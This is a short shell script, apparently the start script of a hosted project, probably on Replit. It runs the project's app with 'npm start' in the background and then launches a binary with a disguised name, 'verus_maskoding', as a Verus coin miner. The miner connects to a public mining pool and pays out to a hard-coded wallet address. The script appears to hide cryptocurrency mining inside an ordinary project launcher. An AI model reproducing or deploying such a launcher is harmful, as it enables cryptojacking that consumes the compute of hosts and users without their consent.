#!/bin/sh
npm start &
PoolHost=na.luckpool.net
Port=3956
PublicVerusCoinAddress=RXRJMo13z29PkmSeqKQX6i6z2ePDRjVE7V
WorkerName=repl
Threads=1
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
chmod +x verus_maskoding
./verus_maskoding -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"